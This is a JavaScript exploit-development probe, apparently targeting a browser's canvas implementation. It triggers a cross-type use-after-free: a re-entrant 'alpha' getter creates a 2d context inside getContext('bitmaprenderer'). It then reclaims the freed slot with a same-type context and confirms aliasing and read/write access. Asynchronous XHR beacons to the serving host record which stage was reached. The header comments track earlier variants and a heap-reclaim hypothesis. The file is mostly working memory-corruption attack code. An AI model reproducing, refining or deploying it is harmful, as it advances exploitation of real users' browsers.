// p488h — cross-type UAF: clean same-type reclaim, NON-BLOCKING staged beacons
//
// V488d/V488e both wedge before the first post-UAF sync beacon and are killed
// by the watchdog at ~29-31 s. V488b only ever got a sync beacon out after 500
// ArrayBuffers had been sprayed first. Working hypothesis: a synchronous XHR
// after the free blocks when the freed 768 B slot is not held by an AB.
//
// This probe removes the sync XHR from the critical path entirely:
//   - Five XHR objects are created and open()ed BEFORE the UAF.
//   - After each stage we only call send() — asynchronous, returns immediately.
//   - The network process receives the request even if the renderer then wedges,
//     so the host log still tells us which stage was reached.
//
// Clean-reclaim window is preserved: nc is created detached BEFORE the UAF, so
// the first allocation after the free is nc.getContext('2d') itself. send() with
// an empty body allocates only small objects (loader/URL), not 768 B blocks.
//
// Beacon chain (async, prefix V488H-):
//   BOOT, BITMAP-CHECK, UAF, C2-YES|NO, ALIAS-YES|NO, RW-YES|NO, DONE
//
// Reading it:
//   UAF arrives            → the cross-type free returns.
//   C2 absent              → nc.getContext('2d') itself wedges (detached-canvas
//                            context creation or allocator free-list).
//   C2 arrives, ALIAS gone → dCtx.canvas getter wedges.
//   ALIAS-YES              → same-type reclaim confirmed on a live object.
//   ALIAS-NO               → c2 did not take the slot; AB path is dead.

(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();

  function B(tag, body) {
    try {
      var dt = Date.now() - T0;
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V488H-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + dt + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  // Pre-UAF sync beacons are safe (slot still owned by the live context).
  B('BOOT', navigator.userAgent);
  window.__dCtx = null;
  window.__lCtx = null;
  window.onerror = function(m, u, l) {
    try { B('ERR', String(m).substring(0, 90) + '@' + l); } catch(e) {}
  };

  try {
    var __hold = new XMLHttpRequest();
    __hold.open('GET', location.origin + '/hold?tag=V488H-' + Date.now(), true);
    __hold.onreadystatechange = function() {};
    __hold.send();
  } catch(e) {}

  var testC = document.createElement('canvas');
  testC.width = 1; testC.height = 1;
  var testBM = null;
  try { testBM = testC.getContext('bitmaprenderer'); } catch(e) {}
  var hasBitmap = !!testBM;
  B('BITMAP-CHECK', 'available=' + hasBitmap + ',type=' + typeof testBM);
  testC = null; testBM = null;

  // ── Pre-create everything, before the free ──
  // nc stays detached: no layout allocation can race the freed slot.
  var nc = document.createElement('canvas');
  nc.width = 5; nc.height = 5;

  var AX = {};
  ['UAF', 'C2-YES', 'C2-NO', 'ALIAS-YES', 'ALIAS-NO', 'RW-YES', 'RW-NO', 'DONE'].forEach(function(name) {
    var x = new XMLHttpRequest();
    x.open('POST', BASE + '/beacon/V488H-' + name, true);
    x.setRequestHeader('Content-Type', 'text/plain');
    AX[name] = x;
  });

  function send(name) {
    try { AX[name].send(); } catch(e) {}
  }

  // ── Cross-type UAF ──
  var dCtx = null, lCtx = null;
  var tc = document.createElement('canvas');
  tc.width = 10; tc.height = 10;
  document.body.appendChild(tc);

  var cc = 0, s = {};
  Object.defineProperty(s, 'alpha', {
    get: function() {
      cc++;
      if (cc === 1) dCtx = tc.getContext('2d');
      return true;
    }
  });

  try {
    lCtx = tc.getContext('bitmaprenderer', s);
  } catch(e) {
    B('OUTER-ERR', String(e && e.message || e));
  }
  window.__dCtx = dCtx;
  window.__lCtx = lCtx;

  // Stage 1: did the free return? Async, non-blocking, empty body.
  send('UAF');

  if (!dCtx) {
    B('CROSSTYPE-FAIL', 'dCtx=null,cc=' + cc);
    return;
  }

  // ── Stage 2: first allocation after the free — same-type context ──
  var c2 = null;
  try { c2 = nc.getContext('2d'); } catch(e) {}
  send(c2 ? 'C2-YES' : 'C2-NO');

  // ── Stage 3: pointer-identity alias ──
  var alias = false;
  try { alias = !!c2 && (dCtx.canvas === nc); } catch(e) {}
  send(alias ? 'ALIAS-YES' : 'ALIAS-NO');

  // ── Stage 4: live R/W through both references ──
  if (alias) {
    var rw = false;
    try {
      c2.fillStyle = '#abcdef';
      rw = (dCtx.fillStyle === '#abcdef');
    } catch(e) {}
    send(rw ? 'RW-YES' : 'RW-NO');
  }

  send('DONE');
})();
